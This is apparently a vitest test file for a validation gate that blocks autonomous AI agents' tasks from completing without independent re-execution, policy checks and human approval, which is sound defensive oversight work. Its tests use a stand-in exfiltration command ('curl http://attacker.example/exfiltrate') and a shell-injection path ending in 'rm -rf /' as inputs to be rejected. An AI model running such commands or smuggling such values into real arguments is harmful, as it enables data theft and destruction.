/**
 * Tests for lib/validation-gate.ts — the completion gate that requires Task.isAutonomous tasks
 * to prove their work with a [WORKERAI_VALIDATION] block before being marked "completed".
 */

import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("@/lib/prisma", () => ({
  prisma: {
    task: { update: vi.fn(), create: vi.fn() },
  },
}));

vi.mock("@/lib/audit", () => ({
  emitAudit: vi.fn(),
}));

vi.mock("child_process", () => ({
  execSync: vi.fn(),
}));

vi.mock("@/lib/policy-engine", () => ({
  evaluatePolicy: vi.fn().mockResolvedValue({
    decision: "allow",
    reason: "default — no file-change rule matched",
    taskId: "task-1",
    category: "file_change",
  }),
  getPolicyApproval: vi.fn().mockResolvedValue(null),
  consumePolicyApproval: vi.fn().mockResolvedValue(undefined),
}));

vi.mock("@/lib/task-secrets", () => ({
  getDecryptedTaskSecrets: vi.fn().mockResolvedValue([]),
}));

import { applyValidationGate, runIndependentValidation } from "../validation-gate";
import { prisma } from "@/lib/prisma";
import { emitAudit } from "@/lib/audit";
import { execSync } from "child_process";
import { evaluatePolicy, getPolicyApproval, consumePolicyApproval } from "@/lib/policy-engine";

const mockTaskUpdate = vi.mocked(prisma.task.update);
const mockTaskCreate = vi.mocked(prisma.task.create);
const mockEmitAudit = vi.mocked(emitAudit);
const mockExecSync = vi.mocked(execSync);
const mockEvaluatePolicy = vi.mocked(evaluatePolicy);
const mockGetPolicyApproval = vi.mocked(getPolicyApproval);
const mockConsumePolicyApproval = vi.mocked(consumePolicyApproval);

const TASK_ID = "task-1";
const PROJECT_ID = "proj-1";
const NONCE = "nonce-xyz";

function passedBlock(evidence = "npm test: 10 passed.") {
  return [
    "[WORKERAI_VALIDATION]",
    `taskId: ${TASK_ID}`,
    `nonce: ${NONCE}`,
    "result: passed",
    `evidence: ${evidence}`,
    "[/WORKERAI_VALIDATION]",
  ].join("\n");
}

function failedBlock(evidence = "npm test: 2 failed.") {
  return [
    "[WORKERAI_VALIDATION]",
    `taskId: ${TASK_ID}`,
    `nonce: ${NONCE}`,
    "result: failed",
    `evidence: ${evidence}`,
    "[/WORKERAI_VALIDATION]",
  ].join("\n");
}

beforeEach(() => {
  vi.clearAllMocks();
  mockTaskUpdate.mockResolvedValue({} as never);
  mockTaskCreate.mockResolvedValue({ id: "followup-1" } as never);
  mockEvaluatePolicy.mockResolvedValue({
    decision: "allow",
    reason: "default — no file-change rule matched",
    taskId: TASK_ID,
    category: "file_change",
  });
  mockGetPolicyApproval.mockResolvedValue(null);
  mockConsumePolicyApproval.mockResolvedValue(undefined);
});

describe("applyValidationGate — independent validation (workspaceDir provided)", () => {
  it("keeps the task completed when independent re-execution agrees with the agent's report", async () => {
    mockExecSync.mockReturnValue(Buffer.from("ok"));

    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Add a button",
      isAutonomous: true,
      paneText: passedBlock("npm test: 42 passed, 0 failed."),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    expect(result.allowed).toBe(true);
    expect(result.validationStatus).toBe("passed");
    expect(result.evidence).toContain("npm test: 42 passed, 0 failed.");
    expect(result.evidence).toContain("independent validation");
    expect(result.evidence).toContain("[lint] exit=0");
    expect(result.evidence).toContain("[build] exit=0");
    expect(mockTaskCreate).not.toHaveBeenCalled();
    expect(mockEmitAudit).toHaveBeenCalledWith(
      expect.objectContaining({
        eventType: "task.validation_passed",
        payload: expect.objectContaining({ independentlyVerified: true }),
      }),
    );
  });

  it("does not trust a passing agent report when independent re-execution disagrees", async () => {
    mockExecSync.mockImplementation((command: string) => {
      if (String(command).includes("typecheck")) {
        const err = Object.assign(new Error("tsc failed"), {
          status: 1,
          stdout: Buffer.from(""),
          stderr: Buffer.from("app/foo.tsx:1:1 - error TS2322"),
        });
        throw err;
      }
      return Buffer.from("ok");
    });

    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Add a button",
      isAutonomous: true,
      paneText: passedBlock("npm test: 42 passed, 0 failed."),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("failed");
    expect(result.evidence).toContain("TS2322");

    expect(mockTaskUpdate).toHaveBeenCalledWith({
      where: { id: TASK_ID },
      data: expect.objectContaining({
        status: "failed",
        validationStatus: "failed",
        lastFailReason: expect.stringContaining("Independent validation failed"),
      }),
    });

    expect(mockTaskCreate).toHaveBeenCalledTimes(1);
    const createArgs = mockTaskCreate.mock.calls[0][0] as { data: Record<string, unknown> };
    expect(String(createArgs.data.description)).toMatch(/TS2322/);

    expect(mockEmitAudit).toHaveBeenCalledWith(
      expect.objectContaining({
        eventType: "task.validation_failed",
        payload: expect.objectContaining({ reason: "independent_check_disagreed" }),
      }),
    );
  });

  it("fails closed (does not blindly trust the agent) when the workspace check itself errors", async () => {
    mockExecSync.mockImplementation(() => {
      throw new Error("ENOENT: workspace vanished");
    });

    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Add a button",
      isAutonomous: true,
      paneText: passedBlock("npm test: 42 passed, 0 failed."),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    // Every command "ran" but failed (exitCode null) — independent check genuinely
    // disagrees with the self-report, so it must not be trusted blindly.
    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("failed");
  });
});

describe("applyValidationGate — file-level policy gate (distinct from dispatch-time policy)", () => {
  // This gate evaluates the ACTUAL files the agent touched (parsed from a
  // real `git status --short`), not the task's riskLevel — it is a separate
  // concern from task-dispatch.ts's dispatch-time gate, which runs before any
  // file has been touched. Here, the self-report and the independent command
  // re-execution can both say "passed" — that has no bearing on whether the
  // changed files themselves are allowed.
  function mockAllCommandsPassButTouch(file: string) {
    // Real `git status --short` format: a 2-char status column, then a
    // separating space, then the path — e.g. " M .env" for a working-tree
    // modification (verified against real git output while writing this).
    mockExecSync.mockImplementation((command: string) => {
      if (String(command).includes("git status")) return Buffer.from(` M ${file}\n`);
      return Buffer.from("ok");
    });
  }

  it("denies completion when the agent touched a file file-level policy denies, even though self-report and independent checks both passed", async () => {
    mockAllCommandsPassButTouch(".env");
    mockEvaluatePolicy.mockResolvedValue({
      decision: "deny",
      reason: "Secret and credential files must not be modified by agents",
      taskId: TASK_ID,
      category: "file_change",
    });

    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Add a config helper",
      isAutonomous: true,
      paneText: passedBlock("npm test: 10 passed."),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("failed");
    expect(result.evidence).toContain(".env");
    expect(mockEvaluatePolicy).toHaveBeenCalledWith(
      expect.objectContaining({ category: "file_change", filePaths: [".env"] }),
    );
    expect(mockTaskUpdate).toHaveBeenCalledWith({
      where: { id: TASK_ID },
      data: expect.objectContaining({ status: "failed", validationStatus: "failed" }),
    });
    expect(mockTaskCreate).toHaveBeenCalledTimes(1);
    expect(mockEmitAudit).toHaveBeenCalledWith(
      expect.objectContaining({
        eventType: "task.validation_failed",
        payload: expect.objectContaining({ reason: "file_level_policy_denied" }),
      }),
    );
  });

  it("blocks completion pending approval when file-level policy requires it and none has been granted", async () => {
    mockAllCommandsPassButTouch("middleware.ts");
    mockEvaluatePolicy.mockResolvedValue({
      decision: "require_approval",
      reason: "Authentication and authorization code changes require review",
      taskId: TASK_ID,
      category: "file_change",
    });
    mockGetPolicyApproval.mockResolvedValue(null);

    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Tweak auth middleware",
      isAutonomous: true,
      paneText: passedBlock("npm test: 10 passed."),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    expect(result.allowed).toBe(false);
    expect(mockConsumePolicyApproval).not.toHaveBeenCalled();
    expect(mockEmitAudit).toHaveBeenCalledWith(
      expect.objectContaining({
        payload: expect.objectContaining({ reason: "file_level_policy_requires_approval" }),
      }),
    );
  });

  it("completes once a file-level policy approval has actually been granted, and consumes it", async () => {
    mockAllCommandsPassButTouch("middleware.ts");
    mockEvaluatePolicy.mockResolvedValue({
      decision: "require_approval",
      reason: "Authentication and authorization code changes require review",
      taskId: TASK_ID,
      category: "file_change",
    });
    mockGetPolicyApproval.mockResolvedValue({
      approvedBy: "admin",
      approvedAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 60_000).toISOString(),
      category: "file_change",
    });

    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Tweak auth middleware",
      isAutonomous: true,
      paneText: passedBlock("npm test: 10 passed."),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    expect(result.allowed).toBe(true);
    expect(result.validationStatus).toBe("passed");
    expect(mockConsumePolicyApproval).toHaveBeenCalledWith(TASK_ID);
  });

  it("does not consult the policy engine at all when nothing changed", async () => {
    mockExecSync.mockImplementation((command: string) => {
      if (String(command).includes("git status")) return Buffer.from("");
      return Buffer.from("ok");
    });

    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "No-op task",
      isAutonomous: true,
      paneText: passedBlock("npm test: 10 passed."),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    expect(result.allowed).toBe(true);
    expect(mockEvaluatePolicy).not.toHaveBeenCalled();
  });
});

describe("applyValidationGate — non-autonomous tasks", () => {
  it("is always allowed and makes no DB writes or audit events", async () => {
    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Some task",
      isAutonomous: false,
      paneText: "anything, doesn't matter",
      expectedNonce: NONCE,
    });
    expect(result).toEqual({ allowed: true, validationStatus: null, verificationState: null, evidence: null });
    expect(mockTaskUpdate).not.toHaveBeenCalled();
    expect(mockTaskCreate).not.toHaveBeenCalled();
    expect(mockEmitAudit).not.toHaveBeenCalled();
  });
});

describe("applyValidationGate — autonomous task reports passed, no workspace available", () => {
  it("does NOT allow completion from the agent's word alone — NOT_VERIFIED, not INDEPENDENTLY_VERIFIED", async () => {
    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Add a button",
      isAutonomous: true,
      paneText: passedBlock("npm test: 42 passed, 0 failed."),
      expectedNonce: NONCE,
      // No workspaceDir — independent verification is mandatory but unavailable.
    });

    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("not_verified");
    expect(result.verificationState).toBe("NOT_VERIFIED");
    expect(result.evidence).toContain("AGENT_REPORTED");
    expect(mockTaskUpdate).toHaveBeenCalledWith({
      where: { id: TASK_ID },
      data: expect.objectContaining({
        status: "needs_review",
        validationStatus: "not_verified",
      }),
    });
    expect(mockEmitAudit).toHaveBeenCalledWith(
      expect.objectContaining({
        eventType: "task.verification_unavailable",
        payload: expect.objectContaining({ reason: "workspace_unavailable" }),
      }),
    );
    // No follow-up task — this isn't a confirmed bug, just an unconfirmed claim.
    expect(mockTaskCreate).not.toHaveBeenCalled();
  });

});

describe("applyValidationGate — defense in depth against an echoed prompt", () => {
  it("never reaches INDEPENDENTLY_VERIFIED from an echoed completion template alone, even without upstream offset protection", async () => {
    // lib/ssh-claude-tmux.ts's detectTaskCompletion is the real upstream
    // defense against matching the [WORKERAI_VALIDATION] template embedded in
    // the dispatch prompt itself (see lib/prompt-sanitiser.ts). This test
    // does not rely on that — it proves the gate has its OWN defense-in-depth
    // property: even a caller that passes raw, unprotected pane text
    // (as if the echo had slipped through upstream) can never result in
    // INDEPENDENTLY_VERIFIED without a real workspace to re-run commands in.
    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Some task",
      isAutonomous: true,
      paneText: passedBlock("<one or two lines — what you ran and the result>"),
      expectedNonce: NONCE,
      // No workspaceDir — simulates the echoed-prompt scenario where no real
      // execution has actually happened yet.
    });

    expect(result.allowed).toBe(false);
    expect(result.verificationState).not.toBe("INDEPENDENTLY_VERIFIED");
    expect(result.verificationState).toBe("NOT_VERIFIED");
  });
});

describe("applyValidationGate — agent reports FAILED even though real re-execution would pass", () => {
  it("trusts a negative self-report without independently re-confirming it (safe by design: never auto-completes from a claim alone)", async () => {
    // Deliberate design choice: independent re-execution only runs to
    // challenge a PASSING claim. A FAILING claim is never auto-upgraded to
    // "passed" by independent re-execution — the agent is in the best
    // position to know it believes it failed, and there is no safety risk in
    // believing a negative claim (the task simply doesn't complete).
    mockExecSync.mockReturnValue(Buffer.from("ok")); // would show a real pass if it were ever run
    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Refactor auth module",
      isAutonomous: true,
      paneText: failedBlock("npm test: 2 failed - login.spec.ts"),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("failed");
    expect(result.verificationState).toBe("VERIFICATION_FAILED");
    // Independent commands were never run for a self-reported failure.
    expect(mockExecSync).not.toHaveBeenCalled();
  });
});

describe("applyValidationGate — validation timeout", () => {
  it("treats a timed-out command as a real failure, not a pass", async () => {
    mockExecSync.mockImplementation((command: string) => {
      if (String(command).includes("npm test")) {
        const err = Object.assign(new Error("ETIMEDOUT"), { status: null, signal: "SIGTERM" });
        throw err;
      }
      return Buffer.from("ok");
    });

    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Add a button",
      isAutonomous: true,
      paneText: passedBlock("npm test: 42 passed, 0 failed."),
      expectedNonce: NONCE,
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
    });

    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("failed");
    expect(result.verificationState).toBe("VERIFICATION_FAILED");
  });
});

describe("applyValidationGate — invalid validation command", () => {
  it("rejects a command not on the allowlist instead of executing it", async () => {
    const result = await runIndependentValidation({
      sshConfig: null,
      workspaceDir: "/tmp/workerai_task-1_123",
      commands: [{ label: "malicious", command: "curl http://attacker.example/exfiltrate" }],
    });

    expect(result.allPassed).toBe(false);
    expect(result.commands[0].exitCode).toBeNull();
    expect(result.commands[0].stderrSummary).toContain("not in the independent-validation command allowlist");
    // The malicious command itself must never reach execSync — only the
    // fixed git-evidence calls (diff/status) are expected to run.
    const executedCommands = mockExecSync.mock.calls.map((call) => call[0]);
    expect(executedCommands).not.toContain("curl http://attacker.example/exfiltrate");
  });
});

describe("applyValidationGate — autonomous tasks, validation explicitly failed", () => {
  it("blocks completion, marks the task failed, and creates an English follow-up task", async () => {
    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Refactor auth module",
      isAutonomous: true,
      paneText: failedBlock("npm test: 2 failed - login.spec.ts"),
      expectedNonce: NONCE,
    });

    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("failed");

    expect(mockTaskUpdate).toHaveBeenCalledWith({
      where: { id: TASK_ID },
      data: expect.objectContaining({
        status: "failed",
        validationStatus: "failed",
        validationEvidence: "npm test: 2 failed - login.spec.ts",
      }),
    });

    expect(mockTaskCreate).toHaveBeenCalledTimes(1);
    const createArgs = mockTaskCreate.mock.calls[0][0] as { data: Record<string, unknown> };
    expect(createArgs.data.projectId).toBe(PROJECT_ID);
    expect(createArgs.data.isAutonomous).toBe(false);
    expect(String(createArgs.data.title)).toMatch(/Refactor auth module/);
    expect(String(createArgs.data.description)).toMatch(/npm test: 2 failed - login\.spec\.ts/);
    // English-only requirement: no non-ASCII letters in generated text.
    expect(String(createArgs.data.title)).toMatch(/^[\x00-\x7F]*$/);
    expect(String(createArgs.data.description)).toMatch(/^[\x00-\x7F]*$/);

    expect(mockEmitAudit).toHaveBeenCalledWith(expect.objectContaining({ eventType: "task.validation_failed" }));
    expect(mockEmitAudit).toHaveBeenCalledWith(expect.objectContaining({ eventType: "task.auto_followup_created" }));
  });
});

describe("applyValidationGate — validation block missing entirely", () => {
  it("blocks completion with validationStatus=missing and creates NO follow-up task", async () => {
    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Some task",
      isAutonomous: true,
      paneText: "[WORKERAI_RESULT]\ntaskId: task-1\nstatus: completed\nnonce: nonce-xyz\n[/WORKERAI_RESULT]",
      expectedNonce: NONCE,
    });

    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("missing");
    expect(mockTaskUpdate).toHaveBeenCalledWith({
      where: { id: TASK_ID },
      data: expect.objectContaining({ status: "failed", validationStatus: "missing" }),
    });
    expect(mockTaskCreate).not.toHaveBeenCalled();
    expect(mockEmitAudit).toHaveBeenCalledTimes(1);
    expect(mockEmitAudit).toHaveBeenCalledWith(expect.objectContaining({ eventType: "task.validation_failed" }));
  });

  it("treats a missing nonce the same as a missing block", async () => {
    const result = await applyValidationGate({
      taskId: TASK_ID,
      projectId: PROJECT_ID,
      title: "Some task",
      isAutonomous: true,
      paneText: passedBlock(),
      expectedNonce: null,
    });
    expect(result.allowed).toBe(false);
    expect(result.validationStatus).toBe("missing");
  });
});

describe("runIndependentValidation — attempted write/execution outside the workspace", () => {
  it("SECURITY: a workspaceDir containing shell metacharacters cannot inject extra commands (local/execSync path)", async () => {
    mockExecSync.mockImplementation((_command, opts) => {
      // execSync receives cwd as a structured option, never concatenated into
      // the command string for the local path — there is no shell string to
      // break out of here. Assert the malicious value was passed through
      // inertly as `cwd`, never interpolated into the command.
      expect((opts as { cwd?: string } | undefined)?.cwd).toBe("/tmp/safe; rm -rf /");
      return Buffer.from("ok");
    });

    const result = await runIndependentValidation({
      sshConfig: null,
      workspaceDir: "/tmp/safe; rm -rf /",
      commands: [{ label: "lint", command: "npm run lint" }],
    });

    expect(result.commands[0].exitCode).toBe(0);
    // The exact command string executed must be untouched by workspaceDir.
    const [calledCommand] = mockExecSync.mock.calls[0];
    expect(calledCommand).toBe("npm run lint");
  });
});
